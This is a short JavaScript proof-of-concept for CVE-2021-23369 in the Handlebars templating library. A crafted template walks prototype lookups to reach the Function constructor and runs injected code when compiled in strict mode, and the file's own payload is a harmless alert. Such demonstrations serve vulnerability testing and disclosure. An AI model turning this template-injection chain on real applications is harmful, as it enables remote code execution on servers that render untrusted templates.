
// CVE-2021-23369

var hand = require('handlebars')

var s = ` 
{{#with "constructor"}} 
{{#with split}} 
{{pop (push "alert('Vulnerable Handlebars JS when compiling in strict mode');")}} 
{{#with .}} 
{{#with (concat (lookup join (slice 0 1)))}} 
{{#each (slice 2 3)}} 
{{#with (apply 0 ../..)}} 
{{.}} 
{{/with}} 
{{/each}} 
{{/with}} 
{{/with}} 
{{/with}} 
{{/with}} 
`;
var template = hand.compile(s, { 
strict: true 
}); 

console.log(template({}))
